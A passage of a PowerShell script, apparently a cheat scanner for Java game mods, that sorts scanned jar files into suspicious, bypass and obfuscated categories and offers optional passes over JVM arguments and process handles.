        $failedMods.Add([PSCustomObject]@{
            FileName = $failName
            Flags    = @("Scan failed — file was NOT analyzed: $failMsg")
        })
        $verifiedMods = [System.Collections.Generic.List[object]]@($verifiedMods | Where-Object { $_.FileName -ne $failName })
        continue
    }

    $name = $r.Name

    $result = $r.Mod
    if ($result -and ($result.Patterns.Count -gt 0 -or $result.Strings.Count -gt 0 -or $result.Fullwidth.Count -gt 0)) {
        $suspiciousMods.Add([PSCustomObject]@{
            FileName  = $name
            Patterns  = $result.Patterns
            Strings   = $result.Strings
            Fullwidth = $result.Fullwidth
        })
        $verifiedMods = [System.Collections.Generic.List[object]]@($verifiedMods | Where-Object { $_.FileName -ne $name })
    }

    $bypassFlags = @($r.Bypass)
    if ($bypassFlags.Count -gt 0) {
        $bypassMods.Add([PSCustomObject]@{ FileName = $name; Flags = $bypassFlags })
        $verifiedMods = [System.Collections.Generic.List[object]]@($verifiedMods | Where-Object { $_.FileName -ne $name })
    }

    $obfFlags = @($r.Obf)
    if ($obfFlags.Count -gt 0) {
        $alreadyFlagged = ($suspiciousMods | Where-Object { $_.FileName -eq $name }).Count -gt 0 -or
                          ($bypassMods     | Where-Object { $_.FileName -eq $name }).Count -gt 0
        if (-not $alreadyFlagged) {
            $obfuscatedMods.Add([PSCustomObject]@{ FileName = $name; Flags = $obfFlags })
            $verifiedMods = [System.Collections.Generic.List[object]]@($verifiedMods | Where-Object { $_.FileName -ne $name })
        }
    }
}

Write-Host "`r$(' ' * 100)`r" -NoNewline
Write-Host

$alreadyScannedMods = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
foreach ($j in $jarFiles) { [void]$alreadyScannedMods.Add($j.FullName) }
$jvmJarRes = New-JarResultSet
$jvmFlags  = @()
$jvmIssues = 0
$jvmRan    = $false

if (Read-YesNo "Do u wanna analyze the jvm flags? Y/N") {
    $jvmTargets = @(Select-JavaTargets)
    if ($jvmTargets.Count -gt 0) {
        $jvmRan = $true
        Write-Host "⚡ Pass 5 — Scanning JVM arguments (agents, injections, cheat patterns)..." -ForegroundColor DarkYellow
        $jvmFlags  = @(Invoke-JvmScan -Targets $jvmTargets)
        $jvmIssues = @($jvmFlags | Where-Object { $_.Issue }).Count
        if ($jvmIssues -gt 0) {
            Write-Host "   ⚠️  JVM issues found!" -ForegroundColor Yellow
        } else {
            Write-Host "   ✓  JVM looks clean" -ForegroundColor DarkGray
        }
        $jvmJarPaths = @(Get-JvmJarPaths -Targets $jvmTargets | Where-Object { -not $alreadyScannedMods.Contains($_) })
        if ($jvmJarPaths.Count -gt 0) {
            Write-Host "   Verifying $($jvmJarPaths.Count) jar(s) referenced by the JVM arguments..." -ForegroundColor DarkGray
            $jvmJarRes = Invoke-JarPipeline -Paths $jvmJarPaths
            $jvmIssues += (Get-JarResultIssues $jvmJarRes)
        }
    }
}
Write-Host

$handleRan      = $false
$handleOverview = [System.Collections.Generic.List[object]]::new()
$handleFlagged  = [System.Collections.Generic.List[object]]::new()
$handleRes      = New-JarResultSet

if (Read-YesNo "Do u wanna analyze the handles? Y/N") {
    $handleTargets = @(Select-JavaTargets)
    if ($handleTargets.Count -gt 0) {
        $handleRan = $true
        Write-Host "🧲 Pass 6 — Scanning process handles (loaded jars + same detection as mods)..." -ForegroundColor DarkYellow
        $handleData = @(Invoke-HandleScan -Targets $handleTargets)

        $extraJars = [ordered]@{}
        foreach ($hd in $handleData) {
            $jarPaths = @($hd.Paths | Where-Object { $_ -match '\.jar$' })
            $inMods = 0; $libSkipped = 0; $queued = 0

            foreach ($p in $hd.Paths) {
                $hits = @(Get-TextHits -Text $p)
                if ($hits.Count -gt 0) {
                    $handleFlagged.Add([PSCustomObject]@{ Pid = $hd.Pid; Name = $hd.Name; Path = $p; Hits = $hits })
                }
            }
            foreach ($jp in $jarPaths) {
                if ($alreadyScannedMods.Contains($jp)) { $inMods++; continue }
                if ($HandleSkipLibraries -and $jp -match '[\\/](libraries|runtime|jre|jdk)[\\/]') { $libSkipped++; continue }
                if (-not $extraJars.Contains($jp)) { $extraJars[$jp] = $true; $queued++ }
            }
            $handleOverview.Add([PSCustomObject]@{
                Pid = $hd.Pid; Name = $hd.Name; Total = $hd.Paths.Count; Jars = $jarPaths.Count
